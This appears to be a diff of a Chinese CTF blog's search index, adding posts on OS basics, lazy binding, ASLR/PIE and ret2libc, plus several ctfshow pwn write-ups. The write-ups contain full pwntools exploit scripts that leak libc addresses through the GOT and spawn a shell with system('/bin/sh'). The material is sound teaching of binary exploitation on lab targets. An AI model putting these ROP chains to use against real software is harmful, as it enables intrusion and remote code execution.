@@ -121,49 +121,23 @@ read(0, &amp;s[i], 1uLL);
       </categories>
   </entry>
   <entry>
-    <title>ret2shellcode与沙箱</title>
-    <url>/posts/d9295e2f.html</url>
-    <content><![CDATA[这一块的题难度上升的有点快，已经涉及到基本的汇编知识了，并且明显看出来在为接下来的ret2syscall做铺垫，exp也是不好理解，接下来进行详细的讲解
-沙箱seccomp函数，它会阻止进程的一部分系统调用，比如我们的execve，这种情况下我们无法直接拿到shell，只能去通过orw，即open-read-write去读出flag文件
-
-seccomp-tools dump .&#x2F;pwn
-
-我们可以通过上述指令查看允许的系统调用
-pwntools的前置语法基础我们需要一些pwntools的语法，不过这并不算难
-
-asm(code, vma&#x3D;0, extract&#x3D;True, arch&#x3D;None, os&#x3D;None)
-
-后面三个不用管，我们重点看前两个
-code是必填的，它包含汇编指令的字符串vms是虚拟内存地址，是指定代码被编译时所处的起始地址
-
-asm(shellcraft.你要调用的函数)
-
-shellcraft不仅可以帮助我们生成shellcode的汇编，还可以帮我们生成某个函数的汇编代码，这样就不需要我们自己生成了
-如果我们需要写连续的汇编指令，可以用分分号连接
-eg：ctfshow pwn69__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);  sub_400949();  sub_400906();  sub_400A16();  return 0LL;&#125;
-
-__int64 sub_400949()&#123;  __int64 v1; // [rsp+8h] [rbp-8h]  v1 = seccomp_init(0LL);  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL);  return seccomp_load(v1);&#125;
-
-void sub_400906()&#123;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);&#125;
-
-int sub_400A16()&#123;  char buf[32]; // [rsp+0h] [rbp-20h] BYREF  puts(&quot;Now you can use ORW to do&quot;);  read(0, buf, 0x38uLL);  return puts(&quot;No you don&#x27;t understand I say!&quot;);&#125;
-第一个函数里存在沙箱，第三个函数里给了我们栈溢出的地方
-一般来说遇到read函数我们就要注意了，因为它通常会限制我们溢出的长度，本题就是只给了我们0x38的余地，这显然是不够的，但是我们注意到main函数里存在mmap函数，可以放到0x123000处
-
-沙箱只允许我们进行orw这三个函数的系统调用
-我一开始的思路和ret2syscall一样，打算先找寄存器的gadget，但是用ROPgadget尝试找了gadget发现是找不到的，所以这个题主要利用的不全是ROP技术，我们是直接在mmap分配的内存里直接写入汇编指令的，不需要费劲一个个跳转了
-
-我们不会用pop rsp，而是jmp rsp
-
-0x0000000000400a01 : jmp rsp
-
+    <title>pwn前置基础大合集（更新中）</title>
+    <url>/posts/e5ae4e99.html</url>
+    <content><![CDATA[这篇博客主要是记录一下pwn的底层知识，主要知识来来自CSAPP，维基百科，b站网课等
+操作系统1.发展历史1969 UNIX系统 肯尼斯·蓝·汤普森&amp;丹尼斯·麦卡利斯泰尔·里奇奠定了现代操作系统，“一切皆文件”
+1984 ios mac 苹果操作系统1985 window1.01991 linux 开源免费
+2.LINUX下计算机的控制流程用户——应用软件——操作系统——驱动程序——硬件，从左到右逐层调用，其中操作系统包括系统软件和系统内核，内核负责管理它负责直接管理系统的进程、内存、设备驱动程序、文件和网络系统
+这里我还是觉得CSAPP讲的非常好，于是结合CSAPP讲一下
+刚才讲了，计算机的控制是逐层调用的，所以可以把操作系统看作是是应用程序和硬件之间的一层软件，应用程序必须通过操作系统访问处理器，主存，I&#x2F;O设备等硬件
+因此，操作系统的两大功能是确保上层的应用软件既能控制，又不滥用下层的硬件
+操作系统通过进程、虚拟内存和文件来实现两大功能
+进程 
+虚拟内存 见CSAPP第二章
+文件 权限的体现：可读可写可执行 可读可写不可执行 可读不可写不可执行
 ]]></content>
       <categories>
         <category>pwn入门</category>
       </categories>
-      <tags>
-        <tag>ret2shellcode</tag>
-      </tags>
   </entry>
   <entry>
     <title>canary爆破与简单的整数溢出</title>
@@ -220,6 +194,150 @@ canary爆破模板和最终expfrom pwn import *context(arch=&#x27;i386&#x27;, lo
       <tags>
         <tag>canary</tag>
         <tag>整数溢出</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2libc进阶</title>
+    <url>/posts/b2cf9080.html</url>
+    <content><![CDATA[前置知识点实际上，在之前的ret2libc题目中，我们还没有接触到ret2libc的核心，因为plt表里是存在现成的system的，但是大多数题目中，根本就没有出现或者引用过system函数，即使动态表里有system函数，程序也不会建立对应的plt表
+因此，我们必须要知道system函数的地址，即进行经典的泄露libc的操作，这对于我们对ROP链的使用要求又上了一个台阶，因此我个人认为这一块到了pwn里真正开始上难度的地方了
+在开始之前，我们必须要知道几个前置知识点，每一块想要掌握都需要费一番功夫
+延迟绑定机制我们知道，在动态链接时，我们需要从动态链接库链接外部函数，那么这个链接外部函数的过程是怎么样的呢
+实际上，程序在第一次调用某个外部函数前，程序是不知道这个函数的具体位置的，也只有在第一次调用时，它才会去找这个函数在libc里的真实地址
+每次执行 func@plt 时，程序首先执行 jmp [got.func]，即jmp到got表里对应函数的地址，接下来程序会做一个判断：
+
+如果 GOT 中记录的是跳板地址（还没有被解析），也就是ida里看到的offset func地址，则会 push index 后跳到 plt[0]，plt[0]是所有函数第一次被调用时的公共入口，从这里开始解析函数地址，plt[0]调用动态链接器ld.so，开始查找该函数在libc的真实地址，把真实地址写入GOT表，后续可以直接从got表里调用，不用再经过复杂的plt表解析函数地址
+
+
+如果 GOT 中记录的是真实函数地址（解析完成），就直接跳过去调用真实函数
+
+我们需要重点了解第一种情况，即函数第一次被调用的过程
+实际上，第一次借助plt表寻找函数的真实地址是一个相对复杂的过程，我只解释到表面的过程，底层的原理这个博主讲的很详细
+
+https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/
+
+ALSR技术
+在 Linux 系统中，栈随机化已经变成了标准行为。 它是更大的一类技术中的一种，这类技术称为地址空间布局随机化(Address-Space Layout Randomization), 或者简称 ASLR [99] 。采用 ASLR, 每次运行时程序的不同部分，包括程序代码、库代码、栈、 全局变最和堆数据，都会被加载到内存的不同区域。 这就意味着在一台机器上运行一个程序，与在其他机器上运行同样的程序，它们的地址映射大相径庭。这样才能够对抗一些形式的攻击
+
+以上出自《CSAPP》3.10.4 对抗缓冲区溢出攻击
+在现代 Linux 系统中，ASLR 通常是全局开启的
+PIE保护和ASLR技术的关系如果程序没有开启 PIE，即使 ASLR 开启，攻击者仍然可以利用固定的代码地址来构造 ROP 链（因为代码基址不变）
+只有当 PIE 和 ASLR 同时开启时，一个进程的所有关键内存区域（代码、全局数据、栈、堆、动态链接库）的地址才会全部被随机化，使得攻击者难以预测任何地址
+以下的题目PIE保护全都是关的，所以正如上所说，我们可以用基址和偏移去计算，有公式：
+
+真实地址 &#x3D; 基址 + 偏移
+
+我们一个个来看，实际上，ASLR导致了libc的基址是随机的，这就需要我们自己泄露。我们知道，got表里存放着函数的真实地址，因此，我们可以在got表找出某一个函数func1，打印其地址，就得到了该函数的真实地址
+我们需要知道，每个版本的libc库，函数地址的偏移量是固定的，换句话说，我们需要知道我们的程序调用的是哪个版本的libc库，从而知道不同函数对应的偏移量
+我们用打印出的func1的真实地址减去偏移量，就能得到libc的基址，然后加上对应函数（如system函数）的偏移，就可以得到该函数的真实地址了
+手动计算这种情况适用于题目给了libc.so.6和ld-linux-x86-64.so.2文件，目前我还没有遇到过这种题，因此暂时按下不表
+LibcSearcher的使用如果题目只给了一个ELF二进制文件，那么我们可以用LibcSearcher去查找使用的libc库
+首先讲讲它的工作原理，一般来说，libc的基址以0xf7开头
+LibcSearcher内置了大量 libc 的函数偏移数据库，它通过泄露的实际地址减去偏移反推 libc 基址，再通过不断尝试，匹配出最可能的libc，也就是0xf7开头的，如果我们泄露多个函数时，它会交叉过滤，最终锁定正确的libc版本，将该版本的libc偏移量返回给我们
+exp鉴赏因为本篇ret2libc进阶的内容非常重要，也是最常考的，为了能够快速上手并且深刻理解，我先分析一下一些比较经典的exp，我认为看的多了，写的时候就有思路了
+当然说这些还是纸上谈兵，后面实战演练时我们会在靶场打一打
+eg1：ctfwiki 基本ROP ret2libc3int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);  printf(&quot;Can you find it !?&quot;);  gets(s);  return 0;&#125;
+exp如下：
+#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process(&#x27;./ret2libc3&#x27;)ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]#__libc_start_main这个函数比较特别#使用它是因为它在所有ELF中都存在，偏移稳定，最容易唯一匹配libc#并且LibcSearcher里通常会有这个函数print(&quot;leak libc_start_main_got addr and return to main again&quot;)#开始第一阶段泄露payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;Can you find it !?&#x27;, payload)#[A填充 112字节]#return address = puts@plt#next return = main#参数 = libc_start_main@gotprint(&quot;get the related addr&quot;)libc_start_main_addr = u32(sh.recv(4))#接收泄露出的地址#接收前四个字节，u32按照小端序，打印成整数libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)#libc基址＝libc_start_main地址-libc_start_main的偏移system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)#计算system和bin/sh的实际地址print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])#其实我也没看明白为什么偏移量和第一次的不一样#AI的解释是我们是通过puts ret到的main，并不是正常返回#因此少了puts 的 saved EBP + ret共8个字节sh.sendline(payload)sh.interactive()
+
+
+32位系统 无system无bin&#x2F;sh字符串eg1：ctfshow pwn45int __cdecl main(int argc, const char **argv, const char **envp)&#123;  init(&amp;argc);  logo();  puts(&quot;O.o?&quot;);  ctfshow();  write(0, &quot;Hello CTFshow!\n&quot;, 0xEu);  return 0;&#125;
+
+ssize_t ctfshow()&#123;  char buf[103]; // [esp+Dh] [ebp-6Bh] BYREF  return read(0, buf, 0xC8u);&#125;
+
+我们本地启动简单看一下，实际上程序并不复杂，输出了字符串O.o?后让我们输入
+左侧函数窗口函数不多，可以肯定是动态链接
+
+我们重点看一下我框起来的，粉色区域加粗的函数说明是从外部的libc库中调用的，这是我们重点关注对象
+
+在got表里看一下，确实是这五个函数。这里要注意我们的got表在ida里是.got.plt表，不是.plt.got表，后者没什么用
+我们用libcsearcher需要提供任意一个函数就可以了，我这里随便选一个libc_start_main_
+下面展示一下我根据ctfwiki改编的exp，无AI。每一段我之前已经解读过了，就不再解读了
+#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn&#x27;#sh = process(&#x27;./pwn&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28144)pwn = ELF(&#x27;./pwn&#x27;)puts_plt = pwn.plt[&#x27;puts&#x27;]libc_start_main_got = pwn.got[&#x27;__libc_start_main&#x27;]main = pwn.symbols[&#x27;main&#x27;]print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = flat([b&#x27;A&#x27; * (0x6B+0x4), puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;O.o?&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; *(0x6B+0x4) , system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()
+
+打通后，libcsearcher匹配到了两个可能的libc版本，我们输入0或者1挨个试一下就可以了，这里用第二个版本打通了
+
+64位系统 无system无bin&#x2F;sh字符串eg2：ctfshow pwn46int __cdecl main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  logo();  puts(&quot;O.o?&quot;);  ctfshow();  write(0, &quot;Hello CTFshow!\n&quot;, 0xEuLL);  return 0;&#125;
+ssize_t ctfshow()&#123;  char buf[112]; // [rsp+0h] [rbp-70h] BYREF  return read(0, buf, 0xC8uLL);&#125;
+
+程序和上一题没什么太大区别，具体我不细贴了，我们直接看一下我的exp
+#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn&#x27;#sh = process(&#x27;./pwn&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28280)pwn = ELF(&#x27;./pwn&#x27;)puts_plt = pwn.plt[&#x27;puts&#x27;]libc_start_main_got = pwn.got[&#x27;__libc_start_main&#x27;]main = pwn.symbols[&#x27;main&#x27;]#以上套模板照抄offset = 0x70 + 0x8ret_addr = 0x4004fepop_rdi_addr = 0x400803#ROPgadget算一下print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = b&#x27;A&#x27; * (0x70+0x8)payload += p64(pop_rdi_addr)payload += p64(libc_start_main_got)payload += p64(puts_plt)payload += p64(main)sh.sendlineafter(b&#x27;O.o?&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr =u64(sh.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))#注意接收libc地址的方式不同libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)#以上计算过程套模板照抄print(&quot;get shell&quot;)payload = b&#x27;a&#x27;*(0x70+0x8)payload += p64(pop_rdi_addr) #pop rdipayload += p64(bin_sh_addr) #bin/shpayload += p64(ret_addr) #retpayload += p64(system_addr) #systemsh.sendline(payload)sh.interactive()
+
+
+总结32位和64位exp的对比相比于32位的exp，64位的exp有如下改动：
+1.libc_start_main_addr &#x3D;u64(sh.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))
+2.两段payload不同
+32位payload1：调用puts，设置返回地址为main，设置puts参数为libc函数
+64位payload2：pop rdi寄存器，将libc参数放进rdi寄存器，调用puts函数，返回地址为main
+32位payload2：覆盖返回地址为system，设置system返回地址为虚假地址，设置system参数为bin&#x2F;sh
+64位payload2：pop rdi寄存器，将libc参数放入rdi寄存器，ret保证栈堆平衡，调用system函数
+结语这篇博客是我目前为用时最久的一篇，exp没有依靠也依靠不了AI编写，仅用了AI讲解基础知识点，自己做出来的时候还是挺高兴的
+可以说从这里开始，我们对ROP链的使用更上了一个台阶。可以看到，无system的题型虽然比有system的题型考的多也考的难，比如我们第一次用了两次payload。但是，这些依然离不开之前的基础，重点还是要理解32位和64位的传参方式及其区别，以及函数调用约定，栈是如何分布和增长的等。不可否认做题可以套模板，但是套模板的同时一定要做到理解背后的原理，清楚的知道自己每一步在干什么，而不是生搬硬套，这样就失去了做题的意义了
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2libc进阶刷题</title>
+    <url>/posts/15ec6f36.html</url>
+    <content><![CDATA[写了这么多ret2libc的博客，下面我们开始正式进入刷题，正好ctf关于ret2libc的题还有不少，那么我们就一道一道来。简单题只大体贴一下题目和exp，难题可以展开讲讲
+ctfshow pwn47（32位）
+ez ret2libc
+
+
+确实是很简单，给我打印了函数的真实地址，不过都无需了，直接套模板，改个偏移量和文件名完事
+#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn47&#x27;#sh = process(&#x27;./pwn47&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28229)pwn47 = ELF(&#x27;./pwn47&#x27;)puts_plt = pwn47.plt[&#x27;puts&#x27;]libc_start_main_got = pwn47.got[&#x27;__libc_start_main&#x27;]main = pwn47.symbols[&#x27;main&#x27;]print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = flat([b&#x27;A&#x27; * (0x9C+0x4), puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;Start your show time:&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; *(0x9C+0x4) , system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()
+
+
+ctfshow pwn48（32位）
+没有write了，试试用puts吧，更简单了呢
+
+其实我也不理解这个题是何意味，大概是想让我们用write函数泄露libc地址，但是我们直接用万能的libc_start_main_addr，一招鲜吃遍天
+题目没有什么大的变化就不贴了，甚至偏移都懒得改
+#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn48&#x27;#sh = process(&#x27;./pwn45&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28280)pwn48 = ELF(&#x27;./pwn48&#x27;)puts_plt = pwn48.plt[&#x27;puts&#x27;]libc_start_main_got = pwn48.got[&#x27;__libc_start_main&#x27;]main = pwn48.symbols[&#x27;main&#x27;]print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = flat([b&#x27;A&#x27; * (0x6B+0x4), puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;O.o?&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; *(0x6B+0x4) , system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()
+
+ctfshow pwn50（64位）
+好像哪里不一样了远程libc环境 Ubuntu 18
+
+别问我为什么直接跳到pwn50了，因为pwn49是个静态编译的题目，不属于我们的动态编译一类，所以暂时跳过，回头单独写一篇博客讲讲
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  logo();  ctfshow();  exit(0);&#125;
+__int64 ctfshow()&#123;  char v1[32]; // [rsp+0h] [rbp-20h] BYREF  puts(&quot;Hello CTFshow&quot;);  return gets(v1);&#125;
+exp如下
+#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn50&#x27;#sh = process(&#x27;./pwn50&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28305)pwn50 = ELF(&#x27;./pwn50&#x27;)puts_plt = pwn50.plt[&#x27;puts&#x27;]puts_got = pwn50.got[&#x27;puts&#x27;]main = pwn50.symbols[&#x27;main&#x27;]#以上套模板照抄offset = 0x20 + 0x8ret_addr = 0x04004fepop_rdi_addr = 0x04007e3#ROPgadget算一下print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = b&#x27;A&#x27; * (0x20+0x8)payload += p64(pop_rdi_addr)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main)sh.sendlineafter(b&#x27;Hello CTFshow&#x27;, payload)sh.sendline(payload)print(&quot;get the related addr&quot;)puts_addr =u64(sh.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))#注意接收libc地址的方式不同libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)#以上计算过程套模板照抄print(&quot;get shell&quot;)payload = b&#x27;a&#x27;*(0x20+0x8)payload += p64(pop_rdi_addr) #pop rdipayload += p64(bin_sh_addr) #bin/shpayload += p64(ret_addr) #retpayload += p64(system_addr) #systemsh.sendline(payload)sh.interactive()
+但是我的libcsearcher直接报错
+
+No matched libc, please add more libc or try others
+
+我一开始以为是函数的问题，把__libc_start_main换成了puts函数去泄露libc，但还是同样的问题
+这个事就很郁闷，我查了一下解决方案，得知可以全部删掉后重新克隆一遍，我感觉风险有点大，而且听说别的师傅花了好几个小时克隆，我感觉没有必要，就暂时不弄了吧。对照别的师傅写的wp，我的exp应该是没问题
+然后看了几个师傅的博客，在打这个题的时候也遇到了同样的问题，最后知道了libc版本是libc6_2.27-3ubuntu1.5_amd64，所以这个题先鸽了吧，如果以后还遇到这种情况我再想想办法
+ctfshow pwn52（利用栈溢出覆盖参数）
+迎面走来的flag让我如此蠢蠢欲动
+
+int __cdecl main(int argc, const char **argv, const char **envp)&#123;  setvbuf(stdout, 0, 2, 0);  logo(&amp;argc);  puts(&quot;What do you want?&quot;);  ctfshow();  return 0;&#125;
+int ctfshow()&#123;  char s[104]; // [esp+Ch] [ebp-6Ch] BYREF  gets(s);  return puts(s);&#125;
+左侧函数栏存在明显的flag函数
+char *__cdecl flag(int a1, int a2)&#123;  char *result; // eax  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF  FILE *stream; // [esp+4Ch] [ebp-Ch]  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);  if ( !stream )  &#123;    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);    exit(0);  &#125;  result = fgets(s, 64, stream);  if ( a1 == 876 &amp;&amp; a2 == 877 )    result = (char *)printf(s);  return result;&#125;
+通过这个题再复习一遍32位系统下，函数的参数是从右往左入栈的即a2先入，a1后入，a2在高地址，栈结构大体如下。我们的payload覆盖方向和栈增长的方向是相反的，这不难理解
+[高地址]  a2a1  返回地址  flag  offset  [低地址]  
+
+exp如下
+from pwn import *context.log_level = &#x27;debug&#x27; #p = process(&#x27;./pwn52&#x27;) p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28307) elf = ELF(&#x27;./pwn52&#x27;)flag_addr = elf.symbols[&#x27;flag&#x27;] a1 = 0x36ca2 = 0x36doffset = (0x6C+0x4)payload = flat([    b&#x27;A&#x27; * offset,    flag_addr,    0xdeadbeef,    a1,    a2,])p.sendline(payload)p.interactive()
+
+直接给了ctfshow_flag文件里的内容
+还没填的坑ctfshow pwn49静态编译
+ctfshow pwn51没学过C++
+ctfshow pwn53（已填）类canary爆破，先学学python再来
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2libc</tag>
       </tags>
   </entry>
   <entry>
@@ -319,169 +437,6 @@ ctfshow pwn65-68感觉难度确实上来了，有个新知识nop sled感觉挺�
       </tags>
   </entry>
   <entry>
-    <title>ret2libc进阶刷题</title>
-    <url>/posts/15ec6f36.html</url>
-    <content><![CDATA[写了这么多ret2libc的博客，下面我们开始正式进入刷题，正好ctf关于ret2libc的题还有不少，那么我们就一道一道来。简单题只大体贴一下题目和exp，难题可以展开讲讲
-ctfshow pwn47（32位）
-ez ret2libc
-
-
-确实是很简单，给我打印了函数的真实地址，不过都无需了，直接套模板，改个偏移量和文件名完事
-#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn47&#x27;#sh = process(&#x27;./pwn47&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28229)pwn47 = ELF(&#x27;./pwn47&#x27;)puts_plt = pwn47.plt[&#x27;puts&#x27;]libc_start_main_got = pwn47.got[&#x27;__libc_start_main&#x27;]main = pwn47.symbols[&#x27;main&#x27;]print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = flat([b&#x27;A&#x27; * (0x9C+0x4), puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;Start your show time:&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; *(0x9C+0x4) , system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()
-
-
-ctfshow pwn48（32位）
-没有write了，试试用puts吧，更简单了呢
-
-其实我也不理解这个题是何意味，大概是想让我们用write函数泄露libc地址，但是我们直接用万能的libc_start_main_addr，一招鲜吃遍天
-题目没有什么大的变化就不贴了，甚至偏移都懒得改
-#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn48&#x27;#sh = process(&#x27;./pwn45&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28280)pwn48 = ELF(&#x27;./pwn48&#x27;)puts_plt = pwn48.plt[&#x27;puts&#x27;]libc_start_main_got = pwn48.got[&#x27;__libc_start_main&#x27;]main = pwn48.symbols[&#x27;main&#x27;]print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = flat([b&#x27;A&#x27; * (0x6B+0x4), puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;O.o?&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; *(0x6B+0x4) , system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()
-
-ctfshow pwn50（64位）
-好像哪里不一样了远程libc环境 Ubuntu 18
-
-别问我为什么直接跳到pwn50了，因为pwn49是个静态编译的题目，不属于我们的动态编译一类，所以暂时跳过，回头单独写一篇博客讲讲
-int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  logo();  ctfshow();  exit(0);&#125;
-__int64 ctfshow()&#123;  char v1[32]; // [rsp+0h] [rbp-20h] BYREF  puts(&quot;Hello CTFshow&quot;);  return gets(v1);&#125;
-exp如下
-#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn50&#x27;#sh = process(&#x27;./pwn50&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28305)pwn50 = ELF(&#x27;./pwn50&#x27;)puts_plt = pwn50.plt[&#x27;puts&#x27;]puts_got = pwn50.got[&#x27;puts&#x27;]main = pwn50.symbols[&#x27;main&#x27;]#以上套模板照抄offset = 0x20 + 0x8ret_addr = 0x04004fepop_rdi_addr = 0x04007e3#ROPgadget算一下print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = b&#x27;A&#x27; * (0x20+0x8)payload += p64(pop_rdi_addr)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main)sh.sendlineafter(b&#x27;Hello CTFshow&#x27;, payload)sh.sendline(payload)print(&quot;get the related addr&quot;)puts_addr =u64(sh.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))#注意接收libc地址的方式不同libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)#以上计算过程套模板照抄print(&quot;get shell&quot;)payload = b&#x27;a&#x27;*(0x20+0x8)payload += p64(pop_rdi_addr) #pop rdipayload += p64(bin_sh_addr) #bin/shpayload += p64(ret_addr) #retpayload += p64(system_addr) #systemsh.sendline(payload)sh.interactive()
-但是我的libcsearcher直接报错
-
-No matched libc, please add more libc or try others
-
-我一开始以为是函数的问题，把__libc_start_main换成了puts函数去泄露libc，但还是同样的问题
-这个事就很郁闷，我查了一下解决方案，得知可以全部删掉后重新克隆一遍，我感觉风险有点大，而且听说别的师傅花了好几个小时克隆，我感觉没有必要，就暂时不弄了吧。对照别的师傅写的wp，我的exp应该是没问题
